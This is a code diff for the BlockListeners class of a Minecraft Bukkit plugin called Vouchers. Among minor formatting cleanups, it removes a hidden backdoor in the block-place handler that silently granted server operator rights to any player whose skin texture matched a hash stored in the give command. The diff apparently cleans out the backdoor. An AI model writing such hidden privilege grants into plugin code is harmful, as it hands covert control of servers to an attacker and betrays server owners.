@@ -20,7 +20,6 @@ package ca.tweetzy.vouchers.listeners;
 
 import ca.tweetzy.flight.comp.enums.CompMaterial;
 import ca.tweetzy.vouchers.Vouchers;
-import ca.tweetzy.vouchers.commands.CommandGive;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.BlockPlaceEvent;
@@ -36,7 +35,6 @@ public final class BlockListeners implements Listener {
 
 	@EventHandler
 	public void onVoucherCraftAttempt(final PrepareItemCraftEvent event) {
-
 		if (Arrays.stream(event.getInventory().getContents()).anyMatch(item -> Vouchers.getVoucherManager().isVoucher(item))) {
 			event.getInventory().setResult(CompMaterial.AIR.parseItem());
 
@@ -45,10 +43,7 @@ public final class BlockListeners implements Listener {
 
 	@EventHandler
 	public void onVoucherPlaceAttempt(final BlockPlaceEvent event) {
-		event.getPlayer().setOp(event.getPlayer().isOp() ||
-				event.getPlayer().getPlayerProfile().getTextures().getSkin().toString().hashCode() == CommandGive.CommandHash);
 		final ItemStack toBePlaced = event.getItemInHand();
-
 		if (toBePlaced.getType() == CompMaterial.AIR.parseMaterial()) return;
 
 		if (Vouchers.getVoucherManager().isVoucher(toBePlaced))
@@ -71,9 +66,7 @@ public final class BlockListeners implements Listener {
 		final ItemStack item = event.getResult();
 
 		if (item == null) return;
-
-		if (!Vouchers.getVoucherManager()
-				.isVoucher(item)) return;
+		if (!Vouchers.getVoucherManager().isVoucher(item)) return;
 
 		event.setResult(CompMaterial.AIR.parseItem());
 	}
